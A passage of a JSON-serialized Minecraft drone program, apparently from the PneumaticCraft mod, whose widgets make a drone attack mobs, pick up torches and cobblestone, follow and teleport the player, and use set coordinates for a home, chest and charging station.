          ""value"": 152.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 152.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""MobScan2""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""MobScan1""
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Kill Mobs""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 63.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 133.0
        }
      },
      {
        ""maxActions"": {
          ""type"": 3,
          ""value"": 0.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""entity_attack""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 137.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 152.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 48.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 100.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Attack Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 63.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 100.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Attack Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 35.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 75.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""@player""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 122.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 163.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -92.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 70.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Start""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 70.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""drone_condition_item""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""requiredCount"": {
          ""type"": 3,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -3.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -3.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:torch""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Torches""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -164.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 8.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -267.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -14.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Torches""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -14.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 8.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:torch""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""DOWN"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""NORTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""WEST"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""inventory_import""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -267.0
        },
        ""count"": {
          ""type"": 3,
          ""value"": 64.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -3.0
        },
        ""UP"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""SOUTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""useCount"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""EAST"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -3.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""drone_condition_item""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""requiredCount"": {
          ""type"": 3,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 19.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 19.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Start""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 52.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -267.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 38.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Sword""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 38.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Sword""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -164.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 30.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""This area needs to be set to your Item Chest""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""comment""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -190.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -27.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Home""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -36.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 600.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 70.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 1023.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -36.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Output Chest""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -25.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 594.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 69.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 1016.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -134.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -25.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -149.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""Charging Station""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -14.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 596.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 70.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 1022.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -181.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 20.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""This area needs to be set to your Home""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""comment""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -101.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -38.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -92.0
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 92.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Tele""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 92.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Follow""
        },
        ""y"": {
          ""type"": 3,
          ""value"": 103.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Player Pickup""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -77.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 114.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -38.0
        }
      },
      {
        ""pickedAmount"": {
          ""type"": 3,
          ""value"": 0.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -27.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""random""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""$owner""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""entity_import""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -16.0
        }
      },
      {
        ""pickedAmount"": {
          ""type"": 3,
          ""value"": 0.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -16.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""random""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""$owner""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""teleport""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -27.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""@player""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -5.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""teleport""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 6.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 6.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Home""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Home""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""entity_export""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 17.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 17.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Home""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Home""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -28.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Tele""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 39.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": -1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 39.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Player Pickup""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -13.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -38.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -252.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 60.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 53.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -46.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Following""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 68.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -46.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""goto""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 53.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -35.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 68.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -35.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""Me""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""Me""
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""condition_coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 53.0
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -24.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 68.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -24.0
        }
      },
      {
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 1.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 68.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -13.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Light Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 38.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -2.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -65.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Air Check""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -65.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge1""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -54.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -54.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate_operator""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""#Bridge2""
        },
        ""checkX"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": -32.0
        },
        ""checkY"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""checkZ"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""operator"": {
          ""type"": 1,
          ""value"": 0.0
        }
      },
      {
        ""useVariable"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""coord"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""coordinate""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 183.0
        },
        ""variable"": {
          ""type"": 8,
          ""value"": ""$owner""
        },
        ""y"": {
          ""type"": 3,
          ""value"": -32.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""area""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 34.0
        },
        ""pos1"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""pos2"": {
          ""type"": 10,
          ""value"": {
            ""X"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Y"": {
              ""type"": 3,
              ""value"": 0.0
            },
            ""Z"": {
              ""type"": 3,
              ""value"": 0.0
            }
          }
        },
        ""boxType"": {
          ""type"": 1,
          ""value"": 0.0
        },
        ""type"": {
          ""type"": 8,
          ""value"": ""box""
        },
        ""var2"": {
          ""type"": 8,
          ""value"": ""#Bridge7""
        },
        ""var1"": {
          ""type"": 8,
          ""value"": ""#Bridge6""
        }
      },
      {
        ""maxActions"": {
          ""type"": 3,
          ""value"": 32.0
        },
        ""useMaxActions"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""place""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 198.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 34.0
        },
        ""order"": {
          ""type"": 3,
          ""value"": 0.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 213.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 45.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:cobblestone""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""item_filter""
        },
        ""x"": {
          ""type"": 3,
          ""value"": 276.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 139.0
        },
        ""id"": {
          ""type"": 8,
          ""value"": ""minecraft:torch""
        },
        ""Count"": {
          ""type"": 1,
          ""value"": 1.0
        }
      },
      {
        ""name"": {
          ""type"": 8,
          ""value"": ""label""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -269.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 88.0
        }
      },
      {
        ""string"": {
          ""type"": 8,
          ""value"": ""Pick up Cobble""
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""text""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -254.0
        },
        ""y"": {
          ""type"": 3,
          ""value"": 88.0
        }
      },
      {
        ""DOWN"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""NORTH"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""WEST"": {
          ""type"": 1,
          ""value"": 1.0
        },
        ""name"": {
          ""type"": 8,
          ""value"": ""inventory_import""
        },
        ""x"": {
          ""type"": 3,
          ""value"": -269.0
        },
        ""count"": {
          ""type"": 3,
